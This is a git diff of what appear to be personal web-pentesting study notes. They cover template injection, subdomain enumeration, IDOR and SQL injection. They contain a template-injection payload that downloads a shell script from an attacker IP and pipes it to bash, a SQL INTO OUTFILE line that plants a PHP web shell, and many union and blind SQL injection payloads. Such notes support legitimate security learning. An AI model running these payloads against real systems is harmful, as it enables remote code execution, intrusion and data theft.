@@ -7,13 +7,12 @@
 - [API](#api)
   - [Git Enumeration](#git-enumeration)
 
-
 ## Server Side Template Injection
+{{7x7}}
 #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.9.1.255:5556/s.sh | bash')}()}
+[SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
 
-https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
-
-## Subdomain
+## DNS - Subdmain
 - search certificates: 
   - https://transparencyreport.google.com/https/overview
   - https://crt.sh/
@@ -26,11 +25,10 @@ https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
 - ffuf
   - -u "$target" -H "Host: FUZZ.$target"
 
-## Wildcards 
+### Wildcards 
 - A lot of false positive
 - need to be filtered
 - dig domain.de A,CNAME {test321123,testingforwildcard,plsdontgimmearesult}.<domain> +short | wc -l ===> > 1, a lot of false positive from brute force
-
 
 - OWAPS *Amass*: amass -src -ip -active -brute -d
   - https://github.com/OWASP/Amass/blob/master/doc/tutorial.md
@@ -41,13 +39,6 @@ https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
 - Create wordlist (from commands above)
   - sed 's/$/.<domain>/' subdomains-top1mil-20000.txt > hosts-wordlist.txt
   
-## User enumeration
--  fuff -w [wordlist] -X [Method] -d " username=FUZZ& data to be sent" -H "additional header request" -u "url" -mr "we are looking for this answer / match regex"
-   -  the *FUZZ* will be replaced by the items in the wordlist
-
-- ffuf -w [Wordlist1]:KeyWord1 , [Wordlist2]:KeyWord2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-w  ww-form-urlencoded" -u http://10.10.1.70/customers/login -fc 200j@fakemail.thm"
-- https://tryhackme.com/room/authenticationbypass
-
 ## IDOR
 Insecure Direct Object Request
 
@@ -113,10 +104,9 @@ Insecure Direct Object Request
 ## DATABASE
 
 ### Steps
-- Crash? = Vulnerable
+- Insert code, if not crash = injection
   - parameter=value' 
   - parameter=value' ORDER BY [#_columns] = try/error
-- find vulnerability: ', "
 - find total columns: UNION SELECT NULL,NULL,NULL
 - find name of db: UNION SELECT NULL,NULL,database()
 - find tables: UNION SELECT NULL,NULL,table_name from **information_schema.tables** WHERE table_schema = 'DB name'
@@ -130,6 +120,9 @@ Insecure Direct Object Request
   - admin'-- [everything here is a comment and will be ignored]
   - or 1 = 1'-- ==> will always return true
   - header:  X-Forwarded-For: IP
+  
+- Write file
+  - SELECT "<?php system($_GET['cmd']); ?>" into outfile "PATH/TO/SQL"
 
 ### UNION
 - join two or more tables + number o columns and data type muss be equal
@@ -174,7 +167,7 @@ Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table--
 #### binary
 - like a% = starting with a
 - Find DB name: ' UNION SELECT, NULL,NULL,NULL where database() like '%a' 
-- Find table name: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.tables** WHERE **table_schema**='name_db' AND **table_name** like '[]%';--
+- Find table name: ' UNION SELECT NULL,NULL,NULL FROM information_schema.tables WHERE **table_schema**='name_db' AND **table_name** like '[]%';--
 - find columns 1: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%';--
 - find columns 2: ' UNION SELECT NULL,NULL,[sleep(4)]|NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%' AND column_name!='found 1';--
 - find content: ' UNION SELECT NULL,NULL,NULL FROM **table_name** where **column_1** like 'a%';--
@@ -238,11 +231,8 @@ Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table--
   - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where *column* like '[character]%';--
   - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where username='[name]' and password like 'a%';--
 
-
 admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
 admin123' UNION SELECT SLEEP(5),2;--
-
-
 
 # Burpsuite
 
